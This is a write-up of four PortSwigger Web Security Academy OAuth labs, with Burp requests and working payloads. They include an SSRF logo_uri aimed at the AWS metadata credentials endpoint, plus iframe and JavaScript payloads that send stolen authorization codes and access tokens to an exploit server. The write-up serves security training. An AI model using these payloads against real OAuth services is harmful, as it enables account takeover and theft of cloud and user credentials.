## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **OAuth Authentication**:

**SSRF via OpenID dynamic client registration**  
This lab demonstrates how attackers can abuse OpenID Connect dynamic client registration to perform server-side request forgery (SSRF).

**Forced OAuth profile linking**  
This lab shows how attackers can force users to link their accounts to attacker-controlled profiles during OAuth authorization.

**OAuth account hijacking via redirect_uri**  
This lab demonstrates how attackers can hijack user accounts by exploiting insecure handling of OAuth redirect URIs.

**Stealing OAuth access tokens via an open redirect**  
This lab shows how attackers can steal OAuth access tokens by chaining open redirect vulnerabilities with OAuth redirection flows.

---

### LAB 2 - SSRF via OpenID dynamic client registration

### Lab Description

<img width="857" height="630" alt="image" src="https://github.com/user-attachments/assets/7465380b-cb5b-4291-863c-63361d9dc134" />

### Solution


OpenID Connect 1.0 is a simple identity layer on the OAuth 2.0 protocol. While OAuth 2.0 is about resource access and sharing, OIDC is about user authentication. It allows Clients to verify the identity of the End-User based on the authentication performed by an Authorization Server, as well as to obtain basic profile information about the End-User in an interoperable and REST-like manner.
The OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register by sending a POST request to a dedicated **/registration** endpoint.

We can see auth endpoint.

<img width="1578" height="342" alt="image" src="https://github.com/user-attachments/assets/c05ec3bd-b73d-4f2a-8673-7a6ed71a6140" />

#Attack scenario


An OAuth registration endpoint is available on the following test website, allowing dynamic registration via client applications. There's a potential vector for SSRF due to the OAuth service's unsafe use of client-specific data.
After the Initial recon, we can find the configuration file that can give us the endpoint for the registration.

While proxying traffic through Burp, log in to your own account. Browse to `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration` to access the configuration file. Notice that the client registration endpoint is located at `/reg`.


<img width="1392" height="668" alt="image" src="https://github.com/user-attachments/assets/03ee8963-aba9-47fa-8106-19e9339147f9" />


You can create a suitable POST request to register your client application with the OAuth service. You must provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application.
```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}

```

<img width="1404" height="801" alt="image" src="https://github.com/user-attachments/assets/118a8197-b011-4c3f-b15d-4a1141907411" />

We know from the `OpenID` specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. This client id can fetch the logo for the specific client.

Go back to the `POST /reg` request in Repeater and replace the current logo_uri value with the target URL:

`"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`


<img width="1404" height="782" alt="image" src="https://github.com/user-attachments/assets/ac737987-1fa4-4dff-8881-c7d4b1b78077" />


Now visit the logo for the client ID mentioned in response to get the access token from the AWS manager.

<img width="1387" height="516" alt="image" src="https://github.com/user-attachments/assets/70a748d3-7f83-4ccd-9c5a-8563d02ca64c" />

Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.

Use the `"Submit solution"` button to submit the access key and solve the lab.

<img width="1626" height="361" alt="image" src="https://github.com/user-attachments/assets/2e55aa9f-36d1-43e6-95a7-bc3df8736412" />


---

### LAB 3 - Forced OAuth profile linking

### Lab Description

<img width="823" height="540" alt="image" src="https://github.com/user-attachments/assets/98016468-ffcb-4494-870d-36d8943f0ec5" />

### Solution

First we login and goto my account and we can see that we have login page and login with soclal media
Now first we login with blog accout

• Blog website account: wiener:peter
• Social media profile: peter.wiener:hotdog

<img width="1134" height="797" alt="image" src="https://github.com/user-attachments/assets/5d4d7485-f864-4af9-b732-b8a0613f58b8" />

Click `"Attach a social profile"`. You are redirected to the social media website, where you should log in using your social media credentials to complete the OAuth flow. Afterwards, you will be redirected back to the blog website.

<img width="549" height="390" alt="image" src="https://github.com/user-attachments/assets/1531218a-1474-4462-a4ba-5ade3d622b29" />

<img width="1651" height="198" alt="image" src="https://github.com/user-attachments/assets/c3c565f4-fdd5-4812-8d71-834f30a62a31" />


Log out and then click "My account" to go back to the login page. This time, choose the "Log in with social media" option. Observe that you are logged in instantly via your newly linked social media account.

<img width="1066" height="559" alt="image" src="https://github.com/user-attachments/assets/8680813e-e982-4c16-835c-8d2bc1a11afa" />

<img width="690" height="433" alt="image" src="https://github.com/user-attachments/assets/3bb88a60-c5d0-4419-93fd-c2c8ce3e3956" />

In the proxy history, study the series of requests for attaching a social profile. In the `GET /auth?client_id[...]` request, observe that the redirect_uri for this functionality sends the authorization code to /oauth-linking. Importantly, notice that the request does not include a **state** parameter to protect against CSRF attacks.

<img width="1440" height="666" alt="image" src="https://github.com/user-attachments/assets/3ea18f91-27df-451b-b58f-577ae9e8bd6f" />

Turn on proxy interception and select the "Attach a social profile" option again.

<img width="1623" height="500" alt="image" src="https://github.com/user-attachments/assets/64377a61-8cc9-456b-9536-f2a2f3dbe832" />

Go to Burp Proxy and forward any requests until you have intercepted the one for GET /oauth-linking?code=[...]. Right-click on this request and select "Copy URL".

<img width="1589" height="638" alt="image" src="https://github.com/user-attachments/assets/de274894-2505-4621-8374-2685e1fe9eed" />

Now we click on login in with soclial profile  and  Drop the intercept request. This is important to ensure that the code is not used and, therefore, remains valid.

<img width="969" height="449" alt="image" src="https://github.com/user-attachments/assets/5b042a48-bdda-47fa-bd3d-e48c0d72b77e" />

Turn off proxy interception click back option on error and log out of the blog website.

<img width="1654" height="411" alt="image" src="https://github.com/user-attachments/assets/af6f9525-4b35-4ff4-b1a8-83a849305081" />

Go to the exploit server and create an iframe in which the src attribute points to the URL you just copied. The result should look something like this:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
```

• Hence you must use iframe or window.location.
• Note: fetch() won't work!!
• The body of the HTML in exploit server:

```
<script>window.location = 'https://ac031fee1e9ea877801e43f100040097.web-security-academy.net/oauth-linking?code=...'</script>
```

Deliver the exploit to the victim. When their browser loads the iframe, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website.

<img width="1163" height="826" alt="image" src="https://github.com/user-attachments/assets/061ca119-1e81-40b8-855f-79ac6439241e" />

Logout form winer account.

<img width="1574" height="507" alt="image" src="https://github.com/user-attachments/assets/672296fe-84d6-4190-b1ad-8cdc399f9bec" />

Now we will login with social media account

<img width="1490" height="510" alt="image" src="https://github.com/user-attachments/assets/f0955384-c3b3-421c-b2f1-91efac2e0704" />


Now when we login we can see that our outh is attached to admin account and we get admin

<img width="1720" height="521" alt="image" src="https://github.com/user-attachments/assets/971edac9-e4f8-4bfe-922d-e3fed911c00e" />


Delete carlos and lab is solved

<img width="1578" height="335" alt="image" src="https://github.com/user-attachments/assets/9477f130-5985-4482-bef1-6ee9371b43d1" />


---

### LAB 4 - OAuth account hijacking via redirect_uri

### Lab Description

<img width="861" height="437" alt="image" src="https://github.com/user-attachments/assets/a79ab778-fa0e-4f7a-8f88-8d92addbff01" />

### Solution

First we login with provided credential


<img width="1775" height="455" alt="image" src="https://github.com/user-attachments/assets/46cc89ec-5a2a-417b-9a8d-db763544ec5e" />


Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.


<img width="1772" height="308" alt="image" src="https://github.com/user-attachments/assets/d2b4be1e-0fe2-4769-9251-b7ac9056fc54" />



In Burp, study the OAuth flow in the proxy history and identify the most recent authorization request. This should start with GET /auth?client_id=[...]


<img width="1867" height="253" alt="image" src="https://github.com/user-attachments/assets/3413d7a6-f4b6-43ca-9208-8ff5461a66d7" />


 Notice that when this request is sent, you are immediately redirected to the redirect_uri along with the authorization code in the query string in the repeater Repeater.


<img width="1457" height="653" alt="image" src="https://github.com/user-attachments/assets/e9bd84ca-a244-435a-aecc-e20fed13b69c" />


After redirection we have session cookie and code

<img width="1476" height="467" alt="image" src="https://github.com/user-attachments/assets/4def3b60-a481-45e6-8ec5-1ce37d5080a5" />


In Burp Repeater, observe that you can submit any arbitrary value as the redirect_uri without encountering an error. Notice that your input is used to generate the redirect in the response.

<img width="1452" height="599" alt="image" src="https://github.com/user-attachments/assets/944b3855-0d02-47ea-bb93-ef8405db215c" />



Change the redirect_uri to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.

<img width="1895" height="78" alt="image" src="https://github.com/user-attachments/assets/6157cbea-62a4-4e24-82ef-de89c5dacf11" />



Now to solve lab we have send this request to admin and steal his session and delete carlos

Copy url to to paste in our payload

<img width="1436" height="712" alt="image" src="https://github.com/user-attachments/assets/84575ce2-683d-4264-ba96-79a16a0e0dd5" />


In our iframe we paste the copy url so it wil give requiest tro our Access log

Payload:
```http

<iframe src="https://oauth-0afc00560493150681550b6802070023.oauth-server.net/auth?client_id=q1tt5i9czwlvdedfb93r7&redirect_uri=https://exploit-0ab600b104ad15cd81b90c0501ca00cf.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>

```
<img width="1534" height="614" alt="image" src="https://github.com/user-attachments/assets/3bf06841-c61f-476a-8c9e-32a021ce51b0" />


Store the exploit and click "View exploit". Check that your iframe loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code.

<img width="1107" height="412" alt="image" src="https://github.com/user-attachments/assets/36090c74-3ff3-4d0a-9654-29d59c289147" />


We can see Access log

<img width="1895" height="78" alt="image" src="https://github.com/user-attachments/assets/5cd9e302-bbd7-448b-8751-04aeebde0f86" />


Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.

<img width="1857" height="173" alt="image" src="https://github.com/user-attachments/assets/44ffffbf-f745-424c-822b-fd44f7d0170f" />


Paste the above code in our callback and we will get the session paste the cookie  come from callback amnd we will ge admin account

<img width="1475" height="394" alt="image" src="https://github.com/user-attachments/assets/6aa20f82-47df-4e45-bb41-6ceb1f725d6b" />


Pasting above cookie came

<img width="1920" height="616" alt="image" src="https://github.com/user-attachments/assets/7c33267e-1112-43a0-a568-a629abd97853" />

We get admin account after pasting above cookie come from request

<img width="1422" height="233" alt="image" src="https://github.com/user-attachments/assets/7aa1faf6-6f0d-4976-bf80-3a47c934c601" />


And delete carlos and lab is solved

<img width="1598" height="376" alt="image" src="https://github.com/user-attachments/assets/4da721d7-a851-4abb-968c-8803405bc167" />


---

### LAB 5 - Stealing OAuth access tokens via an open redirect

<img width="838" height="605" alt="image" src="https://github.com/user-attachments/assets/d80fd9ba-bd08-47d7-a7ed-d83440e5915c" />

### Lab Description

### Solution
First we login we can see two options **myaccount** and home,Now clicked on my account


<img width="1071" height="326" alt="image" src="https://github.com/user-attachments/assets/18c6213b-ca49-4f7d-9c74-f5a080d62616" />



We are redirected when I clicked on my account

<img width="1576" height="311" alt="image" src="https://github.com/user-attachments/assets/46294e30-c1ab-4770-92ef-9301fd578b55" />


After redirection we are login with social media account

<img width="1282" height="618" alt="image" src="https://github.com/user-attachments/assets/0ea3a34e-cb9c-45d3-a40e-74790cbcddf4" />


After login we can see that my account info below.

<img width="1743" height="421" alt="image" src="https://github.com/user-attachments/assets/16b7dd6b-4979-4d43-b065-7ab91b41a6dc" />

Notice that the blog website makes an API call to the userinfo endpoint at **/me** and then uses the data it fetches to log the user in. Send the GET /me request to Burp Repeater.

<img width="1402" height="619" alt="image" src="https://github.com/user-attachments/assets/f71d1153-7a25-4e1e-8019-51f5d8776b3a" />



From the proxy history, find the most recent `GET /auth?client_id=[...]` request and send it to Repeater

<img width="1397" height="581" alt="image" src="https://github.com/user-attachments/assets/dc08bc44-1b8b-483e-8faf-c8d83100f9bf" />



Now Sending above request  to repeater we can see that **302** resposnse


<img width="1408" height="419" alt="image" src="https://github.com/user-attachments/assets/812066fa-f5ce-4541-b682-575383749519" />




After redirection it will redirect us to page

<img width="1438" height="675" alt="image" src="https://github.com/user-attachments/assets/e443d185-30c7-47d1-be00-ad2150e0080b" />


In Repeater, experiment with the `GET /auth?client_id=[...]` request. Observe that you cannot supply an external domain as redirect_uri because it's being validated against a whitelist


<img width="1432" height="410" alt="image" src="https://github.com/user-attachments/assets/0ba039ef-ce23-4291-8a35-537d657ac048" />


We can see in page postid so we can try path traversel in redirect url using this in auth
<img width="1562" height="670" alt="image" src="https://github.com/user-attachments/assets/dfd8407c-f65c-4e2f-b3da-b01f18759ad8" />


As we can see that using `../post?postID=1` redirect us 


<img width="1431" height="664" alt="image" src="https://github.com/user-attachments/assets/1e5ec948-4aad-444b-8bc9-981d39fe66bb" />



Follow above request and we are redirected

<img width="1462" height="599" alt="image" src="https://github.com/user-attachments/assets/74566320-1757-4721-8c8f-8de699aaf557" />

Now we want to redirect to external domain like google

<img width="1896" height="506" alt="image" src="https://github.com/user-attachments/assets/15f879a8-ae13-4515-81f9-5f091d9723c6" />

`
But it is giving us `400 request  which mean idodesnot redirect us t external domain

<img width="1413" height="406" alt="image" src="https://github.com/user-attachments/assets/95503f3a-3c77-462b-b6ec-d5176dcb2224" />

In the  blog post we clicked on next post

<img width="1058" height="822" alt="image" src="https://github.com/user-attachments/assets/f5ee2e2b-8870-4052-a3f8-a4a79c38bb6c" />


We see request of next post in http history which we can check if it redirect us to external domain

<img width="1601" height="491" alt="image" src="https://github.com/user-attachments/assets/2ff633ed-3464-49c7-ad52-18d952876b8c" />


Yes `next?path` is redirecting us to external domain


<img width="1189" height="238" alt="image" src="https://github.com/user-attachments/assets/944d5a21-ecaf-4028-9ef0-e2ac5c61f560" />

Now apply path traversal in in `/../post/next?path=http://goggle.com` to check that the auth request redirected us to external domain


<img width="1428" height="513" alt="image" src="https://github.com/user-attachments/assets/44686c92-803a-455a-90b8-64bbed4a0661" />

And we follow redirectcon it will take us to `google.com`

<img width="1346" height="517" alt="image" src="https://github.com/user-attachments/assets/3355b7d5-37ad-45d8-b8e2-2b1b82c52b5d" />


Explot server we store hello world

<img width="1179" height="759" alt="image" src="https://github.com/user-attachments/assets/3268bb14-3427-405d-ab45-332adf3e7b6f" />


change redirecturl to exploit sever

<img width="1456" height="424" alt="image" src="https://github.com/user-attachments/assets/72a00d0f-f654-4ab4-9c9f-65c52d2d02ef" />




And follow above redirection gives us hello world which we store on exploit server

<img width="1464" height="569" alt="image" src="https://github.com/user-attachments/assets/5e954053-69c2-446d-a90c-89217f97ed2b" />

We can also see above request in Access log

<img width="1910" height="178" alt="image" src="https://github.com/user-attachments/assets/70c200f1-e4b2-4b14-941d-c4f50cbf1123" />


On the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:



```
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```

The **substr()** method extracts a part of a string.

<img width="1176" height="729" alt="image" src="https://github.com/user-attachments/assets/ab70d1f5-0509-43ef-8302-9928e8453988" />

hash is reponse from which we leave first charcter which is @ and copy other all
Store above payload in eploit server

<img width="1176" height="729" alt="image" src="https://github.com/user-attachments/assets/506a8202-5027-4edc-9331-0712fd0d0cc3" />


Pasting exploit server id/exploit in redirect url

<img width="1834" height="351" alt="image" src="https://github.com/user-attachments/assets/a2698341-593b-4118-99f1-f68ba8590b37" />


Now we can see get  fragment request of /? But it is not giving us access token beacuser there is some issue in it

<img width="1385" height="115" alt="image" src="https://github.com/user-attachments/assets/a4796edc-1a65-40c2-9caf-f219bbbb3b80" />


You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:

```

<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>

```

Store the above payload and and make appropratite change delivere it we will get access token of admin in access log

<img width="1535" height="777" alt="image" src="https://github.com/user-attachments/assets/1e8c422d-6d4b-498c-a9f2-2b841916b87b" />


Access log gives us Access token

<img width="1897" height="156" alt="image" src="https://github.com/user-attachments/assets/45b84840-2758-4dc3-8dea-2147b41d7249" />


In Repeater, go to the `GET /me` request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.

<img width="1391" height="590" alt="image" src="https://github.com/user-attachments/assets/f97b0a9a-1220-4be5-b21b-5b4fd703face" />



Use the **"Submit solution"** button at the top of the lab page to submit the stolen key and solve the lab.

<img width="1540" height="296" alt="image" src="https://github.com/user-attachments/assets/13c7c3f9-948f-477a-ba9f-2618e30cfb7d" />



---
